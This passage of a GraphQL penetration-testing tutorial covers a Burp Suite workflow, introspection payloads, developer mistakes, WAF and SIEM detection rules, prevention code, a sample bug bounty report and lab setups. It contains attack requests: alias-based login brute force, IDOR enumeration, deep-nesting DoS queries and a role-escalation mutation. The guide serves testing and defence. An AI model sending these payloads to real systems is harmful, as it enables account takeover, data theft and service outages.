**clairvoyance** -- Schema reconstruction when introspection is disabled:
```bash
pip install clairvoyance
clairvoyance https://target.example.com/graphql -o schema.json
```

**graphql-cop** -- Security auditor for GraphQL:
```bash
pip install graphql-cop
graphql-cop -t https://target.example.com/graphql
```

**graphw00f** -- GraphQL server fingerprinting:
```bash
pip install graphw00f
graphw00f -t https://target.example.com/graphql
```

---

## 16. Burp Suite Workflow for GraphQL Testing

### Step 1: Identify GraphQL Endpoints

Browse the target application with Burp Proxy active. Look for:

- Requests to `/graphql`, `/api/graphql`, `/v1/graphql`, `/gql`
- POST requests with `Content-Type: application/json` containing `"query"` key
- WebSocket connections to `ws://*/graphql` (for subscriptions)

### Step 2: Introspection via Repeater

Send the full introspection query from Section 1 to Repeater. If it returns the schema, save the response -- this is your map for the entire engagement.

```http
POST /graphql HTTP/1.1
Host: target.example.com
Content-Type: application/json

{"query":"{__schema{queryType{name}mutationType{name}types{kind name fields(includeDeprecated:true){name args{name type{kind name ofType{kind name ofType{kind name}}}}type{kind name ofType{kind name ofType{kind name}}}isDeprecated}}}}"}
```

### Step 3: Use InQL for Schema Analysis

If InQL is installed, it automatically parses the introspection response and generates queries. Review the generated queries in the InQL tab.

### Step 4: Authorization Testing Matrix

For each query and mutation discovered, test with Repeater:

| Test | Action |
|------|--------|
| Unauthenticated | Remove Authorization header |
| Regular user | Use regular user's token |
| Different user | Use another regular user's token |
| Admin | Use admin token (if available) |
| Expired token | Use an expired JWT |
| Modified token | Tamper with JWT claims |

### Step 5: IDOR Testing with Intruder

For queries that accept ID parameters:

1. Send the query to Intruder
2. Mark the ID value as a position:

```json
{"query":"{ user(id: \"$$1$$\") { id name email } }"}
```

3. Load a payload list of sequential IDs or known UUIDs
4. Run the attack and analyze which responses return data (IDOR confirmed)

### Step 6: Batch/Alias Brute Force with Repeater

For login brute force via aliases, construct the payload in Repeater:

```json
{
  "query": "{ a0: login(email: \"admin@target.com\", password: \"password1\") { token } a1: login(email: \"admin@target.com\", password: \"password2\") { token } a2: login(email: \"admin@target.com\", password: \"password3\") { token } }"
}
```

Monitor responses for successful login (non-null `token` field).

### Step 7: Deep Nesting DoS Test

Incrementally increase query depth in Repeater while monitoring response times:

```
Depth 1: { users { name } }                           -> 50ms
Depth 3: { users { friends { friends { name } } } }   -> 200ms
Depth 5: { users { friends { friends { friends { friends { name } } } } } } -> 5000ms
Depth 7: [timeout]
```

Document the depth at which performance degrades.

### Step 8: Mutation Testing with Repeater

For each mutation, test:

1. Can you execute it without authentication?
2. Can you modify another user's data by changing the ID?
3. Can you set fields that should be restricted (e.g., `role: "ADMIN"`)?
4. What happens if you provide unexpected input types?

### Step 9: Document All Findings

Use Burp's "Issues" or "Organizer" to log each finding with:
- The exact HTTP request
- The response showing the vulnerability
- The impact assessment
- Reproduction steps

---

## 17. Introspection Query Payloads

### Full Schema Extraction (One-Liner)

```
{"query":"{__schema{queryType{name}mutationType{name}subscriptionType{name}types{kind name description fields(includeDeprecated:true){name description args{name description type{kind name ofType{kind name ofType{kind name ofType{kind name}}}}}type{kind name ofType{kind name ofType{kind name ofType{kind name}}}}isDeprecated deprecationReason}inputFields{name description type{kind name ofType{kind name ofType{kind name ofType{kind name}}}}}interfaces{kind name ofType{kind name ofType{kind name ofType{kind name}}}}enumValues(includeDeprecated:true){name description isDeprecated deprecationReason}possibleTypes{kind name ofType{kind name ofType{kind name ofType{kind name}}}}}directives{name description locations args{name description type{kind name ofType{kind name ofType{kind name ofType{kind name}}}}}}}"}
```

### Types Only

```json
{"query": "{ __schema { types { name kind description } } }"}
```

### Queries and Mutations

```json
{"query": "{ __schema { queryType { fields { name description args { name type { name kind } } type { name kind } } } mutationType { fields { name description args { name type { name kind ofType { name } } } } } } }"}
```

### Subscriptions

```json
{"query": "{ __schema { subscriptionType { fields { name description args { name type { name kind } } type { name kind } } } } }"}
```

### Specific Type Fields

```json
{"query": "{ __type(name: \"User\") { name kind fields { name type { name kind ofType { name kind } } } } }"}
```

### Enum Values

```json
{"query": "{ __type(name: \"UserRole\") { enumValues { name description } } }"}
```

### Input Types

```json
{"query": "{ __type(name: \"CreateUserInput\") { inputFields { name type { name kind ofType { name } } } } }"}
```

### Deprecated Fields Only

```json
{"query": "{ __schema { types { name fields(includeDeprecated: true) { name isDeprecated deprecationReason type { name } } } } }"}
```

### GET-Based Introspection (for bypass)

```
GET /graphql?query=%7B__schema%7Btypes%7Bname%20kind%7D%7D%7D HTTP/1.1
Host: target.example.com
```

---

## 18. Common Developer Mistakes

### Mistake 1: Relying on Frontend to Hide Queries

```javascript
// Frontend only shows "safe" queries, but the schema accepts anything
// "Security through obscurity" -- the schema is self-documenting
```

### Mistake 2: Authorization Only at the Query Level

```javascript
// BAD: Checks auth on top-level query but not nested resolvers
Query: {
  me: requireAuth((_, __, ctx) => { /* returns user with all relationships */ })
}
// User.company.employees.salary is accessible without checking if
// the requesting user should see salary data
```

### Mistake 3: Exposing Database Columns as GraphQL Fields

```python
# BAD: Auto-generating schema from database model
@strawberry.type
class User:
    id: str
    email: str
    password_hash: str    # Direct database column exposure
    totp_secret: str      # Direct database column exposure
    internal_flags: int   # Direct database column exposure
```

### Mistake 4: No Query Depth or Complexity Limits

```javascript
// BAD: No validation rules at all
const server = new ApolloServer({
  typeDefs,
  resolvers,
  // No depthLimit, no complexity analysis
  // Attackers can send arbitrarily deep/complex queries
});
```

### Mistake 5: Introspection Enabled in Production

```javascript
// BAD: Default Apollo Server enables introspection
const server = new ApolloServer({
  typeDefs,
  resolvers,
  // introspection defaults to true
});
```

### Mistake 6: Batch Queries Enabled Without Rate Limiting

```javascript
// BAD: Accepting array of queries without limit
// An attacker sends 10,000 login mutations in one request
```

### Mistake 7: Not Sanitizing Variables Before Database Queries

```javascript
// BAD: Passing GraphQL variables directly to MongoDB
users: async (_, { filter }) => {
  return await User.find(filter); // NoSQL injection via { "$ne": null }
}
```

### Mistake 8: Verbose Error Messages in Production

```json
{
  "errors": [{
    "message": "Cannot query field \"passwor\" on type \"User\". Did you mean \"password\" or \"passwordHash\"?",
    "extensions": {
      "stackTrace": "Error: Cannot query field...\n    at /app/node_modules/graphql/validation/..."
    }
  }]
}
```

---

## 19. Detection Strategies

### Log Analysis

Log all GraphQL operations (query name, depth, complexity, user) and alert on anomalies:

```javascript
// Apollo Server logging plugin
const loggingPlugin = {
  requestDidStart(requestContext) {
    const startTime = Date.now();
    return {
      async didResolveOperation(ctx) {
        const operationName = ctx.operationName || 'anonymous';
        const operationType = ctx.operation?.operation || 'unknown';
        console.log(JSON.stringify({
          type: 'graphql_operation',
          operation: operationName,
          operationType: operationType,
          user: ctx.contextValue?.user?.id || 'anonymous',
          timestamp: new Date().toISOString(),
        }));
      },
      async willSendResponse(ctx) {
        const duration = Date.now() - startTime;
        if (duration > 5000) {
          console.warn(JSON.stringify({
            type: 'slow_graphql_query',
            duration,
            query: requestContext.request.query?.substring(0, 500),
            user: ctx.contextValue?.user?.id || 'anonymous',
          }));
        }
      },
    };
  },
};
```

### WAF Rules for GraphQL

```
# Block introspection in production
SecRule REQUEST_BODY "@rx __schema|__type" \
    "id:2001,phase:2,deny,status:403,msg:'GraphQL Introspection Blocked'"

# Block batch queries (JSON array at top level)
SecRule REQUEST_BODY "@rx ^\[" \
    "id:2002,phase:2,deny,status:403,msg:'GraphQL Batch Query Blocked'"

# Detect deep nesting (more than 5 opening braces in sequence pattern)
SecRule REQUEST_BODY "@rx \{[^}]*\{[^}]*\{[^}]*\{[^}]*\{[^}]*\{" \
    "id:2003,phase:2,deny,status:403,msg:'GraphQL Deep Nesting Detected'"
```

### SIEM Queries

```
# Detect introspection attempts
index=web_logs uri_path="/graphql" request_body="*__schema*"
| stats count by src_ip, user
| where count > 3

# Detect brute force via aliases
index=web_logs uri_path="/graphql" request_body="*login*"
| rex field=request_body "(?P<alias_count>login)" max_match=0
| where mvcount(alias_count) > 5
| stats count by src_ip
```

### Runtime Monitoring

```javascript
// Track resolver execution counts per request
const resolverTracker = {
  requestDidStart() {
    let resolverCount = 0;
    return {
      executionDidStart() {
        return {
          willResolveField() {
            resolverCount++;
            if (resolverCount > 1000) {
              throw new Error('Query complexity exceeded: too many resolver calls');
            }
          },
        };
      },
    };
  },
};
```

---

## 20. Prevention Strategies

### Strategy 1: Disable Introspection in Production

```javascript
// Apollo Server
const server = new ApolloServer({
  typeDefs,
  resolvers,
  introspection: process.env.NODE_ENV !== 'production',
});
```

```python
# Strawberry
schema = strawberry.Schema(
    query=Query,
    mutation=Mutation,
    extensions=[DisableIntrospection()] if IS_PRODUCTION else [],
)
```

### Strategy 2: Implement Query Depth Limiting

```javascript
// npm install graphql-depth-limit
const depthLimit = require('graphql-depth-limit');

const server = new ApolloServer({
  typeDefs,
  resolvers,
  validationRules: [depthLimit(5)],
});
```

### Strategy 3: Implement Query Complexity Analysis

```javascript
// npm install graphql-validation-complexity
const { createComplexityLimitRule } = require('graphql-validation-complexity');

const server = new ApolloServer({
  typeDefs,
  resolvers,
  validationRules: [
    depthLimit(5),
    createComplexityLimitRule(1000, {
      scalarCost: 1,
      objectCost: 2,
      listFactor: 10,
    }),
  ],
});
```

### Strategy 4: Per-Resolver Authorization

```javascript
// Every resolver explicitly checks authorization
const resolvers = {
  Query: {
    adminDashboard: (_, __, context) => {
      if (!context.user || context.user.role !== 'ADMIN') {
        throw new AuthenticationError('Admin access required');
      }
      // ... resolver logic
    },
  },
  User: {
    // Even nested fields check authorization
    salary: (parent, _, context) => {
      if (!context.user || context.user.role !== 'HR' && context.user.id !== parent.id) {
        return null; // Or throw error
      }
      return parent.salary;
    },
  },
};
```

### Strategy 5: Limit Batch Queries and Aliases

```javascript
// Reject batch queries (array requests)
app.use('/graphql', (req, res, next) => {
  if (Array.isArray(req.body)) {
    return res.status(400).json({ error: 'Batch queries are not supported' });
  }
  next();
});

// Limit aliases via plugin (see Section 8)
```

### Strategy 6: Rate Limit by Operation Count

```javascript
const rateLimit = require('express-rate-limit');

// Rate limit per operation, not per request
app.use('/graphql', (req, res, next) => {
  // Count operations (aliases + batch)
  const body = req.body;
  let operationCount = 1;

  if (Array.isArray(body)) {
    operationCount = body.length;
  } else if (body.query) {
    // Count top-level aliases (rough heuristic)
    const aliasMatches = body.query.match(/\w+\s*:/g);
    if (aliasMatches) {
      operationCount = aliasMatches.length;
    }
  }

  // Deduct from rate limit budget
  req.rateLimit = { weight: operationCount };
  next();
});
```

### Strategy 7: Persisted Queries (Allowlist)

The strongest defense: only allow pre-approved queries. Clients send a query hash instead of the query itself:

```javascript
const { ApolloServer } = require('@apollo/server');

// Only these queries are allowed
const allowedQueries = {
  'abc123hash': '{ me { name email } }',
  'def456hash': 'mutation Login($email: String!, $password: String!) { login(email: $email, password: $password) { token } }',
  // ... all approved queries
};

const server = new ApolloServer({
  typeDefs,
  resolvers,
  persistedQueries: {
    cache: new Map(Object.entries(allowedQueries)),
  },
  // Reject any query not in the allowlist
  allowBatchedHttpRequests: false,
});
```

### Strategy 8: Remove Field Suggestions

```javascript
formatError: (error) => {
  if (error.message.includes('Did you mean')) {
    return { message: 'Invalid field' };
  }
  return error;
},
```

---

## 21. Bug Bounty Report Example

### Title

GraphQL Introspection Enabled + Missing Authorization on Admin Mutations Allows Complete Account Takeover via Role Escalation

### Severity

**Critical (CVSS 9.8)**

The GraphQL API has introspection enabled in production, exposing the complete schema including admin-only mutations. The `updateUserRole` mutation lacks authorization checks, allowing any authenticated user to escalate their role to `ADMIN` and subsequently access all admin functionality including user data export, account deletion, and configuration changes.

### Affected Endpoint

```
POST /graphql
Host: api.example.com
```

### Steps to Reproduce

**Step 1:** Create a regular user account and obtain a JWT token via the login flow.

**Step 2:** Send an introspection query to extract the full schema:

```http
POST /graphql HTTP/1.1
Host: api.example.com
Content-Type: application/json
Authorization: Bearer eyJhbGciOiJIUzI1NiIs...

{
  "query": "{ __schema { mutationType { fields { name args { name type { name kind } } } } } }"
}
```

**Step 3:** The response reveals an `updateUserRole` mutation:

```json
{
  "data": {
    "__schema": {
      "mutationType": {
        "fields": [
          {
            "name": "updateUserRole",
            "args": [
              { "name": "userId", "type": { "name": "ID", "kind": "SCALAR" } },
              { "name": "role", "type": { "name": "String", "kind": "SCALAR" } }
            ]
          }
        ]
      }
    }
  }
}
```

**Step 4:** Extract your own user ID from the `me` query:

```http
POST /graphql HTTP/1.1
Host: api.example.com
Content-Type: application/json
Authorization: Bearer eyJhbGciOiJIUzI1NiIs...

{"query": "{ me { id email role } }"}
```

Response: `{ "data": { "me": { "id": "user-abc-123", "email": "attacker@evil.com", "role": "USER" } } }`

**Step 5:** Escalate to admin:

```http
POST /graphql HTTP/1.1
Host: api.example.com
Content-Type: application/json
Authorization: Bearer eyJhbGciOiJIUzI1NiIs...

{
  "query": "mutation { updateUserRole(userId: \"user-abc-123\", role: \"ADMIN\") { id email role } }"
}
```

**Response:**

```json
{
  "data": {
    "updateUserRole": {
      "id": "user-abc-123",
      "email": "attacker@evil.com",
      "role": "ADMIN"
    }
  }
}
```

**Step 6:** Verify admin access by querying the admin dashboard:

```http
POST /graphql HTTP/1.1
Host: api.example.com
Content-Type: application/json
Authorization: Bearer eyJhbGciOiJIUzI1NiIs...

{"query": "{ adminDashboard { totalUsers totalRevenue recentSignups { id email name } } }"}
```

Response: returns full admin dashboard data including all users' information.

### Impact

1. **Complete privilege escalation**: Any authenticated user can become an admin
2. **Full data access**: Admin role grants access to all user data, including PII
3. **Account takeover**: Admin role allows password resets and account modifications for all users
4. **Data destruction**: Admin role grants access to `deleteUser` mutation
5. **Schema disclosure**: Introspection reveals the complete API surface for further attacks

### Additional Findings During Investigation

- **No query depth limit**: Nested `friends { friends { ... } }` queries to depth 10+ cause 30+ second response times (DoS)
- **No rate limiting on login mutation**: Alias-based brute force possible (tested 100 password attempts in a single request)
- **`User` type exposes `passwordHash` field**: `{ users { passwordHash } }` returns bcrypt hashes for all users

### Recommended Remediation

1. **Immediately** disable introspection in production
2. **Immediately** add authorization checks to all admin mutations (`updateUserRole`, `deleteUser`, `exportUserData`)
3. **Immediately** remove `passwordHash`, `ssn`, and `apiKey` from the GraphQL type definitions
4. Implement query depth limiting (max depth: 5)
5. Implement query complexity analysis (max complexity: 1000)
6. Implement per-operation rate limiting (not per-request)
7. Disable batch queries if not needed by the frontend
8. Limit aliases to a maximum of 10 per query
9. Remove field suggestions from error messages
10. Rotate all password hashes (force password reset for all users since hashes were exposed)

---

## 22. Lab Setup Ideas

### Lab 1: Vulnerable Apollo Server

Use the vulnerable code from Section 13 in a Docker container:

```dockerfile
FROM node:20-alpine
WORKDIR /app
COPY package*.json ./
RUN npm install @apollo/server @apollo/server/express4 express graphql jsonwebtoken pg
COPY . .
EXPOSE 4000
CMD ["node", "server.js"]
```

```yaml
# docker-compose.yml
version: "3.8"
services:
  api:
    build: .
    ports:
      - "4000:4000"
    environment:
      - DATABASE_URL=postgresql://admin:password@db:5432/vulnapp
      - JWT_SECRET=insecure-secret
    depends_on:
      - db

  db:
    image: postgres:15
    environment:
      POSTGRES_USER: admin
      POSTGRES_PASSWORD: password
      POSTGRES_DB: vulnapp
    volumes:
      - ./init.sql:/docker-entrypoint-initdb.d/init.sql
```

**init.sql:**

```sql
CREATE TABLE users (
    id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
    name TEXT NOT NULL,
    email TEXT UNIQUE NOT NULL,
    password_hash TEXT NOT NULL,
    role TEXT DEFAULT 'USER',
    ssn TEXT,
    api_key TEXT,
    internal_notes TEXT,
    created_at TIMESTAMP DEFAULT NOW(),
    last_login TIMESTAMP
);

CREATE TABLE friendships (
    user_id UUID REFERENCES users(id),
    friend_id UUID REFERENCES users(id),
    PRIMARY KEY (user_id, friend_id)
);

CREATE TABLE payments (
    id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
    user_id UUID REFERENCES users(id),
    amount DECIMAL(10,2),
    created_at TIMESTAMP DEFAULT NOW()
);

-- Insert test data
INSERT INTO users (id, name, email, password_hash, role, ssn, api_key, internal_notes) VALUES
('11111111-1111-1111-1111-111111111111', 'Admin User', 'admin@example.com', '$2b$12$LJ3m4ys3Lk...', 'ADMIN', '111-11-1111', 'ak_admin_secret', 'Super admin account'),
('22222222-2222-2222-2222-222222222222', 'Regular User', 'user@example.com', '$2b$12$abc...', 'USER', '222-22-2222', 'ak_user_secret', 'Regular account'),
('33333333-3333-3333-3333-333333333333', 'Another User', 'another@example.com', '$2b$12$def...', 'USER', '333-33-3333', 'ak_another_secret', 'Test account');

INSERT INTO friendships VALUES
('22222222-2222-2222-2222-222222222222', '33333333-3333-3333-3333-333333333333'),
('33333333-3333-3333-3333-333333333333', '22222222-2222-2222-2222-222222222222');

INSERT INTO payments (user_id, amount) VALUES
('22222222-2222-2222-2222-222222222222', 99.99),
('33333333-3333-3333-3333-333333333333', 149.99);
```

### Lab 2: DVGA (Damn Vulnerable GraphQL Application)

The best pre-built GraphQL security lab:

```bash
docker run -p 5013:5013 dolevf/dvga
```

DVGA includes challenges for:
- Introspection
- DoS (nesting, batching)
- Injection
- Authorization bypass
- Information disclosure
- And more

### Lab 3: Practice Exercises

1. **Extract the full schema** using the introspection query
2. **Visualize the schema** using graphql-voyager
3. **Find the admin mutation** and escalate your role
4. **Read the passwordHash field** for all users
5. **Perform a login brute force** using aliases (100 passwords in one request)
6. **Trigger a DoS** by nesting friends queries 10 levels deep
7. **Exploit IDOR** by querying other users' data with their UUIDs
8. **Bypass introspection blocking** using GET requests and __type queries
9. **Discover hidden fields** using the field suggestion error messages
10. **Chain findings**: introspection -> role escalation -> data exfiltration

---

## 23. Conclusion

GraphQL is not inherently less secure than REST. It is differently secure. The concentration of the entire API surface behind a single endpoint, combined with a self-documenting schema, client-controlled field selection, and recursive query capabilities, creates a unique threat model that demands specific defensive measures.

The most critical takeaway for defenders: **authorization must be implemented in every resolver, not at the endpoint level.** This is the single most common GraphQL security failure. A REST API with 50 endpoints has 50 places to add authorization middleware. A GraphQL API with one endpoint has dozens of resolvers that each need their own authorization logic -- and developers routinely miss some of them.

For testers, GraphQL targets are a gift. The introspection system gives you the complete attack surface map. Aliases and batch queries let you amplify any vulnerability. Field suggestions leak schema information even when introspection is disabled. The tooling ecosystem (InQL, graphql-voyager, Altair, clairvoyance) is mature and effective.

Start every GraphQL engagement with introspection. Visualize the schema. Test every query and mutation across privilege levels. Try nesting, aliasing, and batching. Check for IDOR on every ID parameter. Test mutations for unauthorized access. Check subscriptions for information leakage.

If you do this systematically, you will find bugs. GraphQL APIs are among the most consistently vulnerable targets in modern bug bounty programs.

---

**Next in this series:** Part 10 covers Rate Limiting and Brute Force Attacks -- testing and bypassing rate limits, credential stuffing, CAPTCHA bypass techniques, and distributed brute force methodologies.

*If this guide helped you find your next GraphQL bug, share it with your security team. The more defenders who understand these attack techniques, the harder our job gets -- and that is a good thing.*
